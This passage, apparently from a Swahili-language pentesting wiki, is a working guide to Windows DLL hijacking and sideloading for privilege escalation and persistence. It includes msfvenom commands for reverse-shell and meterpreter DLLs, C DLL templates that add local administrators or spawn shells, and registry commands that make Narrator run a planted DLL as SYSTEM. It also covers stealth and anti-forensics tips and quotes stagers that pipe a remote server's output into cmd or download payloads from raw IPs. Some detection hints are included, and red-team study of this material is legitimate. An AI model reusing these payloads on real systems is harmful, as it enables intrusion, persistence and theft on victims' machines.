[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)itaangalia kama una ruhusa za kuandika kwenye folda yoyote iliyo ndani ya system PATH.\
Zana nyingine za kiotomatiki zinazofaa kugundua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Ukigundua hali inayoweza kutumiwa vibaya, mojawapo ya mambo muhimu zaidi ili kufanikiwa kuitumia ni **kutengeneza dll inayotoa angalau functions zote ambazo executable itaagiza kutoka kwake**. Hata hivyo, kumbuka kuwa DLL Hijacking inaweza kusaidia [kupandisha ruhusa kutoka kiwango cha Medium Integrity hadi High **(kwa kukwepa UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka [**High Integrity hadi SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kutengeneza dll halali** katika utafiti huu wa dll hijacking unaolenga DLL hijacking kwa ajili ya utekelezaji: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **sehemu inayofuata** unaweza kupata **misimbo ya msingi ya dll** inayoweza kusaidia kama **templates** au kutengeneza **dll inayotoa functions zisizohitajika**.

## **Kutengeneza na ku-compila DLLs**

### **Kufanya DLL Proxifying**

Kimsingi, **DLL proxy** ni DLL inayoweza **kutekeleza msimbo wako hasidi inapopakiwa**, na pia **kuonyesha** na **kufanya kazi** kama **inavyotarajiwa**, kwa **kuelekeza upya miito yote kwenye library halisi**.

Kwa kutumia zana ya [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus), unaweza **kubainisha executable na kuchagua library** unayotaka kufanya proxifying, kisha **kutengeneza dll iliyofanyiwa proxifying**, au **kubainisha DLL** na **kutengeneza dll iliyofanyiwa proxifying**.

### **Meterpreter**

**Pata rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Pata meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Unda mtumiaji (x86; sikuona toleo la x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Yako mwenyewe

Katika hali nyingi, DLL unayo-compile lazima **iexport kila function ambayo victim process hu-import**. Ikiwa export inayohitajika haipo, binary haiwezi kuirekebisha na exploit itashindwa.

<details>
<summary>Kiolezo cha C DLL (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>C++ DLL mfano wa kuunda mtumiaji</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL mbadala ya C yenye entry point ya thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Uchunguzi wa Kesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe bado hukagua DLL ya localization inayotegemea lugha na yenye eneo linalotabirika wakati wa kuanza. DLL hii inaweza kutekwa nyara ili kutekeleza msimbo wowote na kudumisha uwepo.<sup>[[7]](#references)</sup>

Mambo muhimu
- Njia inayokaguliwa (build za sasa): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Njia ya zamani (build za awali): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ikiwa DLL inayodhibitiwa na mshambuliaji inaweza kuandikwa kwenye njia ya OneCore, itapakiwa na `DllMain(DLL_PROCESS_ATTACH)` itatekelezwa. Hakuna exports zinazohitajika.

Ugunduzi kwa kutumia Procmon
- Chuja kwa: `Process Name is Narrator.exe` na `Operation is Load Image` au `CreateFile`.
- Anzisha Narrator na uone jaribio la kupakia kutoka kwenye njia iliyo hapo juu.

DLL ndogo ya msingi
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC silence
- Hijack ya kawaida itatoa sauti/kuangazia UI. Ili kufanya kazi kwa ukimya, wakati wa attach orodhesha threads za Narrator, fungua thread kuu (`OpenThread(THREAD_SUSPEND_RESUME)`) na uisimamishe kwa `SuspendThread`; endelea kwenye thread yako mwenyewe. Tazama PoC kwa msimbo kamili.<sup>[[8]](#references)</sup>

Kuchochea na persistence kupitia usanidi wa Accessibility
- Muktadha wa mtumiaji (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa mipangilio iliyo hapo juu, kuanzisha Narrator hupakia DLL iliyowekwa. Kwenye secure desktop (skrini ya kuingia), bonyeza CTRL+WIN+ENTER ili kuanzisha Narrator; DLL yako hutekelezwa kama SYSTEM kwenye secure desktop.

Utekelezaji wa SYSTEM unaochochewa na RDP (lateral movement)
- Ruhusu classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Unganisha kwa RDP kwenye host, kisha kwenye skrini ya kuingia bonyeza CTRL+WIN+ENTER ili kuanzisha Narrator; DLL yako hutekelezwa kama SYSTEM kwenye secure desktop.
- Utekelezaji husimama session ya RDP inapofungwa—inject/migrate haraka.

Bring Your Own Accessibility (BYOA)
- Unaweza kuiga ingizo la registry la Accessibility Tool (AT) iliyojengewa ndani (kwa mfano, CursorIndicator), kulihariri ili lielekeze kwenye binary/DLL yoyote, kuliingiza, kisha kuweka `configuration` iwe jina la AT hiyo. Hii hutekeleza programu yoyote kupitia Accessibility framework.

Maelezo
- Kuandika ndani ya `%windir%\System32` na kubadilisha thamani za HKLM kunahitaji haki za admin.
- Mantiki yote ya payload inaweza kuwekwa ndani ya `DLL_PROCESS_ATTACH`; hakuna exports zinazohitajika.

## Uchunguzi wa Kisa: CVE-2025-1729 - Privilege Escalation kwa Kutumia TPQMAssistant.exe

Kisa hiki kinaonyesha **Phantom DLL Hijacking** katika TrackPoint Quick Menu ya Lenovo (`TPQMAssistant.exe`), inayofuatiliwa kama **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Maelezo ya Udhaifu

- **Kipengele**: `TPQMAssistant.exe` iliyoko `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` huendeshwa kila siku saa 9:30 AM katika muktadha wa mtumiaji aliyeingia.
- **Ruhusa za Saraka**: Inaweza kuandikwa na `CREATOR OWNER`, hivyo watumiaji wa ndani wanaweza kuweka faili zozote.
- **Tabia ya Utafutaji wa DLL**: Hujaribu kupakia `hostfxr.dll` kutoka kwenye saraka yake ya kufanya kazi kwanza, na kurekodi "NAME NOT FOUND" ikiwa haipo; hii inaonyesha kuwa utafutaji katika saraka ya ndani hupewa kipaumbele.

### Utekelezaji wa Exploit

Mshambulizi anaweza kuweka stub hasidi ya `hostfxr.dll` kwenye saraka hiyo hiyo, na kutumia DLL inayokosekana kupata utekelezaji wa msimbo katika muktadha wa mtumiaji:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Mtiririko wa Mashambulizi

1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` ndani ya `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri scheduled task iendeshwe saa 9:30 AM katika muktadha wa mtumiaji wa sasa.
3. Ikiwa msimamizi ameingia wakati task inaendeshwa, DLL hasidi huendeshwa katika session ya msimamizi ikiwa na medium integrity.
4. Unganisha mbinu za kawaida za UAC bypass ili kupata SYSTEM privileges kutoka medium integrity.

## Uchunguzi wa Kisa: MSI CustomAction Dropper + DLL Side-Loading kupitia Signed Host (wsc_proxy.exe)

Watendaji wa vitisho mara nyingi huunganisha droppers zinazotumia MSI na DLL side-loading ili kutekeleza payloads chini ya mchakato unaoaminika na uliosainiwa.<sup>[[10]](#references)</sup>

Muhtasari wa mnyororo
- Mtumiaji anapakua MSI. CustomAction huendeshwa kimyakimya wakati wa usakinishaji wa GUI (kwa mfano, LaunchApplication au kitendo cha VBScript), na kuunda upya hatua inayofuata kutoka kwenye embedded resources.
- Dropper huandika EXE halali na iliyosainiwa pamoja na DLL hasidi kwenye saraka moja (jozi ya mfano: wsc_proxy.exe iliyosainiwa na Avast + wsc.dll inayodhibitiwa na mshambuliaji).
- Signed EXE inapoanzishwa, mpangilio wa utafutaji wa DLL wa Windows hupakia kwanza wsc.dll kutoka kwenye working directory, na kutekeleza msimbo wa mshambuliaji chini ya signed parent (ATT&CK T1574.001).

Uchambuzi wa MSI (mambo ya kuchunguza)
- Jedwali la CustomAction:
  - Tafuta maingizo yanayoendesha executables au VBScript. Mfano wa muundo wa kutiliwa shaka: LaunchApplication inayotekeleza faili iliyopachikwa chinichini.
  - Katika Orca (Microsoft Orca.exe), kagua jedwali la CustomAction, InstallExecuteSequence na Binary.
- Payloads zilizopachikwa/zinazogawanywa ndani ya MSI CAB:
  - Uchimbaji wa kiutawala: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Au tumia lessmsi: lessmsi x package.msi C:\out
  - Tafuta vipande vingi vidogo vinavyounganishwa na kusimbuliwa na CustomAction ya VBScript. Mtiririko wa kawaida:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading kwa kutumia wsc_proxy.exe
- Weka faili hizi mbili kwenye folda moja:
  - wsc_proxy.exe: host halali iliyosainiwa (Avast). Mchakato hujaribu kupakia wsc.dll kwa jina kutoka kwenye folda yake.
  - wsc.dll: DLL ya mshambulizi. Ikiwa exports maalum hazihitajiki, DllMain inaweza kutosha; vinginevyo, tengeneza proxy DLL na uelekeze exports zinazohitajika kwenye library halisi huku ukiendesha payload ndani ya DllMain.
- Tengeneza payload ndogo ya DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Kwa mahitaji ya export, tumia mfumo wa proxying (kwa mfano, DLLirant/Spartacus) ili kutengeneza forwarding DLL ambayo pia hutekeleza payload yako.

- Mbinu hii hutegemea utatuzi wa majina ya DLL na binary ya host. Ikiwa host hutumia absolute paths au safe loading flags (kwa mfano, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack inaweza kushindwa.
- KnownDLLs, SxS na forwarded exports zinaweza kuathiri mpangilio wa precedence, na lazima zizingatiwe unapochagua binary ya host na seti ya exports.

## Signed triads + encrypted payloads (uchunguzi wa ShadowPad)

Check Point ilieleza jinsi Ink Dragon inavyotumia **triad ya faili tatu** kusambaza ShadowPad na kujificha katika programu halali huku ikiweka payload kuu ikiwa imesimbwa kwa njia fiche kwenye diski:<sup>[[12]](#references)</sup>

1. **EXE ya host iliyosainiwa** – wauzaji kama AMD, Realtek au NVIDIA hutumiwa vibaya (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Washambuliaji hubadilisha jina la executable ili ionekane kama binary ya Windows (kwa mfano `conhost.exe`), lakini sahihi ya Authenticode hubaki halali.
2. **Loader DLL hasidi** – huwekwa karibu na EXE ikiwa na jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Kwa kawaida DLL hii ni binary ya MFC iliyofichwa kwa kutumia mfumo wa ScatterBrain; kazi yake pekee ni kutafuta blob iliyosimbwa kwa njia fiche, kuifungua, na kupakia ShadowPad reflectively.
3. **Blob ya payload iliyosimbwa kwa njia fiche** – mara nyingi huhifadhiwa kama `<name>.tmp` kwenye saraka hiyo hiyo. Baada ya kupakia payload iliyofunguliwa kwenye memory-mapping, loader hufuta faili ya TMP ili kuharibu ushahidi wa forensics.

Vidokezo vya tradecraft:

* Kubadilisha jina la EXE iliyosainiwa (huku ukihifadhi `OriginalFileName` asilia kwenye kichwa cha PE) huiruhusu kujifanya binary ya Windows huku ikihifadhi sahihi ya muuzaji; kwa hiyo, iga tabia ya Ink Dragon ya kuweka binaries zinazoonekana kama `conhost.exe` lakini kwa kweli ni utilities za AMD/NVIDIA.
* Kwa kuwa executable hubaki kuwa trusted, vidhibiti vingi vya allowlisting vinahitaji tu DLL yako hasidi iwekwe kando yake. Zingatia kubinafsisha loader DLL; parent iliyosainiwa kwa kawaida inaweza kuendeshwa bila mabadiliko.
* Decryptor ya ShadowPad inatarajia blob ya TMP iwe karibu na loader na iweze kuandikwa ili iweze kufuta faili baada ya kuipakia kwenye memory. Acha saraka iweze kuandikwa hadi payload ipakiwe; ikiwa kwenye memory, faili ya TMP inaweza kufutwa kwa usalama kwa OPSEC.

### Mnyororo wa LOLBAS stager + staged archive sideloading (finger → tar/curl → WMI)

Waendeshaji huunganisha DLL sideloading na LOLBAS ili artifact pekee maalum kwenye diski iwe DLL hasidi iliyo karibu na EXE inayoaminika:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** PowerShell iliyofichwa huanzisha `cmd.exe /c`, hupata commands kutoka kwa Finger server, na kuzipeleka kwa `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` hupakua maandishi kupitia TCP/79; `| cmd` hutekeleza majibu ya server, na kuwawezesha waendeshaji kubadilisha server ya second stage upande wa server.

- **Upakuaji/ufunguzi wa faili uliojengewa ndani:** Pakua archive yenye extension isiyo na madhara, ifungue, kisha weka target ya sideload pamoja na DLL chini ya folda nasibu ya `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` huficha maendeleo na kufuata uelekezaji upya; `tar -xf` hutumia tar iliyojengewa ndani ya Windows.

- **Uzinduzi wa WMI/CIM:** Anzisha EXE kupitia WMI ili telemetry ionyeshe mchakato ulioundwa na CIM inapopakia DLL iliyo kwenye saraka hiyo hiyo:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Hufanya kazi na binaries zinazopendelea kutumia DLL za ndani (k.m., `intelbq.exe`, `nearby_share.exe`); payload (k.m., Remcos) huendeshwa chini ya jina linaloaminika.

- **Uwindaji:** Toa tahadhari `forfiles` inapoonekana pamoja na `/p`, `/m`, na `/c`; mchanganyiko huu si wa kawaida nje ya scripts za admin.


## Uchunguzi wa Kesi: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Shambulizi la hivi majuzi la Lotus Blossom lilitumia vibaya mnyororo wa update unaoaminika kuwasilisha dropper iliyopakiwa kwa NSIS, iliyoweka DLL sideload pamoja na payloads zinazoendeshwa kikamilifu kwenye memory.<sup>[[13]](#references)</sup>

Mtiririko wa Tradecraft
- `update.exe` (NSIS) hutengeneza `%AppData%\Bluetooth`, huiweka alama ya **HIDDEN**, na kuweka Bitdefender Submission Wizard `BluetoothService.exe` yenye jina lililobadilishwa, `log.dll` hasidi, na blob iliyosimbwa kwa njia fiche `BluetoothService`, kisha huzindua EXE.
- Host EXE hu-import `log.dll` na kuita `LogInit`/`LogWrite`. `LogInit` hupakia blob kwa mmap; `LogWrite` huifungua kwa kutumia stream maalum ya LCG (constants **0x19660D** / **0x3C6EF35F**, key material inayotokana na hash ya awali), hubadilisha buffer kwa shellcode ya plaintext, huachilia temp files, kisha hurukia humo.
- Ili kuepuka IAT, loader hutatua API kwa ku-hash majina ya export kwa kutumia **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, kisha kutumia Murmur-style avalanche (**0x85EBCA6B**) na kulinganisha matokeo na salted target hashes.

Shellcode kuu (Chrysalis)
- Hufungua main module inayofanana na PE kwa kurudia add/XOR/sub kwa kutumia key `gQ2JR&9;` katika passes tano, kisha hupakia `Kernel32.dll` kwa nguvu → `GetProcAddress` ili kukamilisha utatuzi wa import.
- Hujenga upya strings za majina ya DLL wakati wa runtime kupitia transforms za bit-rotate/XOR kwa kila herufi, kisha hupakia `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Hutumia resolver ya pili inayopitia **PEB → InMemoryOrderModuleList**, kuchambua kila export table katika blocks za baiti 4 kwa Murmur-style mixing, na kutumia `GetProcAddress` kama njia mbadala tu ikiwa hash haipatikani.

Configuration iliyopachikwa na C2
- Config imo ndani ya faili iliyoachwa `BluetoothService` kwenye **offset 0x30808** (size **0x980**) na hufunguliwa kwa RC4 kwa kutumia key `qwhvb^435h&*7`, na kufichua URL ya C2 na User-Agent.
- Beacons huunda host profile iliyotenganishwa kwa nukta, huongeza tag `4Q` mwanzoni, kisha huificha kwa RC4 kwa kutumia key `vAuig34%^325hGV` kabla ya `HttpSendRequestA` kupitia HTTPS. Majibu hufunguliwa kwa RC4 na kutumwa kulingana na tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + hali za uhamishaji wa vipande).
- Hali ya utekelezaji huamuliwa na CLI args: bila args = husakinisha persistence (service/Run key) inayoelekeza kwa `-i`; `-i` huzindua tena yenyewe kwa `-k`; `-k` huruka usakinishaji na kuendesha payload.

Loader mbadala iliyobainika
- Shambulizi hilo hilo liliweka Tiny C Compiler na kuendesha `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, huku `libtcc.dll` ikiwa kando yake. C source iliyotolewa na mshambuliaji ilikuwa na shellcode iliyopachikwa, ili-compile na kuendeshwa kwenye memory bila kuweka PE kwenye disk. Iga kwa:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Hatua hii ya ku-compile-and-run inayotegemea TCC iliingiza `Wininet.dll` wakati wa utekelezaji na kupakua shellcode ya hatua ya pili kutoka URL iliyowekwa moja kwa moja kwenye msimbo, hivyo kutoa loader inayoweza kubadilishwa na kujifanya kuwa uendeshaji wa compiler.

## Sideloading ya host iliyosainiwa kwa kutumia export proxying + host thread parking

Baadhi ya minyororo ya DLL sideloading huongeza **uimarishaji wa uthabiti** ili host halali ibaki ikiendelea kwa muda wa kutosha kupakia hatua zinazofuata vizuri, badala ya ku-crash baada ya DLL hasidi kupakiwa.<sup>[[11]](#references)</sup>

Muundo ulioonekana
- Weka EXE inayoaminika kando ya DLL hasidi, ukitumia jina la dependency linalotarajiwa kama `version.dll`.
- DLL hasidi **hufanya proxy kwa kila export inayotarajiwa** na kuzielekeza kwenye DLL halisi ya mfumo (kwa mfano `%SystemRoot%\\System32\\version.dll`) ili utatuzi wa imports uendelee kufanikiwa na mchakato wa host uendelee kufanya kazi.
- Baada ya kupakiwa, DLL hasidi **hufanya patch kwenye entry point ya host** ili thread kuu iingie kwenye kitanzi kisicho na mwisho cha `Sleep` badala ya kutoka au kuendesha njia za msimbo zitakazositisha mchakato.
- Thread mpya hufanya kazi hasidi halisi: kusimbua jina au njia ya DLL ya hatua inayofuata (RC4/XOR hutumika mara nyingi), kisha kuizindua kwa `LoadLibrary`.

Kwa nini hili ni muhimu
- Kufanya proxy ya kawaida ya DLL hudumisha uoanifu wa API, lakini hakuhakikishi kuwa host itabaki ikiendelea kwa muda wa kutosha kwa hatua zinazofuata.
- Kuweka thread kuu kwenye `Sleep(INFINITE)` ni njia rahisi ya kuweka mchakato uliosainiwa ukiendelea huku loader ikifanya usimbuaji, staging, au uanzishaji wa mtandao kwenye worker thread.
- Kutafuta tu `DllMain` inayotia shaka kunaweza kukosa muundo huu ikiwa tabia muhimu hutokea baada ya entry point ya host kufanyiwa patch na thread ya pili kuanza.

Mtiririko wa chini kabisa wa kazi
1. Nakili EXE ya host iliyosainiwa na utambue DLL inayotafutwa kutoka kwenye saraka ya ndani.
2. Tengeneza proxy DLL inayotoa functions zilezile na kuzielekeza kwenye DLL halali.
3. Kwenye `DllMain(DLL_PROCESS_ATTACH)`, tengeneza worker thread.
4. Kutoka kwenye thread hiyo, fanya patch kwenye entry point ya host au routine ya kuanzisha main thread ili izunguke kwenye `Sleep`.
5. Simbua jina/config ya DLL ya hatua inayofuata na uite `LoadLibrary` au ufanye manual-map ya payload.

Viashiria vya uchunguzi wa kiulinzi
- Michakato iliyosainiwa inayopakia `version.dll` au maktaba nyingine zinazotumika sana kutoka kwenye saraka yake ya programu badala ya `System32`.
- Memory patches kwenye entry point ya mchakato muda mfupi baada ya kupakiwa kwa image, hasa jumps/calls zinazoelekezwa kwenye `Sleep`/`SleepEx`.
- Threads zilizoundwa na proxy DLL ambazo huita mara moja `LoadLibrary` kwa DLL ya pili yenye jina lililosimbuliwa.
- Proxy DLL zinazokamilisha exports zote zikiwa zimewekwa kando ya executable za vendor ndani ya saraka za staging zinazoweza kuandikwa, kama `ProgramData`, `%TEMP%`, au njia za archive zilizofunguliwa.

## References

- [1] [Red Canary – Maarifa ya kijasusi: Januari 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Kupandisha Haki kwa Kutumia TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking katika Windows. Mfano rahisi wa C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Inatumia Malware Mpya Kulenga Ulaya](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks Zinapokutana na Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Maradufu wa Kidijitali: Muundo wa Kampeni za Uigaji Zinazobadilika Zinazosambaza Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Maslahi Yanayokutana: Uchambuzi wa Makundi ya Vitisho Yanayolenga Serikali ya Kusini-Mashariki mwa Asia](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ndani ya Ink Dragon: Kufichua Mtandao wa Relay na Utendaji wa Ndani wa Operesheni ya Kificho ya Kukera](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Uchambuzi wa Kina wa Zana za Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – Mnyororo wa HTB Bruno ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Kufuatilia Kampeni za Ujasusi za 2026 za APT ya Iran Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Haraka na Kali: Operesheni za Nimbus Manticore Wakati wa Mzozo wa Iran](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Vitendo vya Task](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Yalenga Serikali na Miundombinu Muhimu ya Kusini-Mashariki mwa Asia](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Microsoft Learn – Muundo wa PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [27] [FortiGuard Labs – Kufichua Lahaja ya SectopRAT Iliyofichwa Ndani ya Programu Halali](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
{{#include ../../../banners/hacktricks-training.md}}
